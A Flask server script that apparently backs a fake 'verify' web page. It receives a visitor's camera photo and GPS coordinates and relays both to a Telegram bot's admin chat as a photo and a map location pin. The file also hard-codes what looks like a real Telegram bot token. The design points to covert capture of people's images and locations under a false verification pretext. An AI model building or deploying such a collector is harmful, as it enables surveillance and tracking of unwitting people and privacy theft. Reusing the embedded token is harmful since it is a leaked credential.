from flask import Flask, request, send_from_directory
import requests, os

BOT_TOKEN = "8358391409:AAEeDC5zWqlG2EoFxyTzHGkFkr1Rmi7jMic"
ADMIN_CHAT_ID = 6508791739
UPLOAD_DIR = "uploads"

os.makedirs(UPLOAD_DIR, exist_ok=True)
app = Flask(__name__)

# Single slash '/' add karne se direct link kaam karega
@app.route("/")
@app.route("/verify")
def verify():
    return send_from_directory(".", "index.html")

@app.route("/upload", methods=["POST"])
def upload():
    file = request.files.get("photo")
    lat = request.form.get("lat")
    lon = request.form.get("lon")

    if not file:
        return "No photo", 400

    path = os.path.join(UPLOAD_DIR, "verify.jpg")
    file.save(path)

    caption_text = "📸 Photo Upload Received!"
    if lat and lon:
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        caption_text += f"\n📍 Location Link: {maps_link}"

    # Telegram Photo Send
    tg_photo_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(path, "rb") as f:
        requests.post(tg_photo_url, data={"chat_id": ADMIN_CHAT_ID, "caption": caption_text}, files={"photo": f})

    # Telegram Map Location Pin Send
    if lat and lon:
        tg_loc_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
        requests.post(tg_loc_url, data={
            "chat_id": ADMIN_CHAT_ID,
            "latitude": lat,
            "longitude": lon
        })

    return "OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
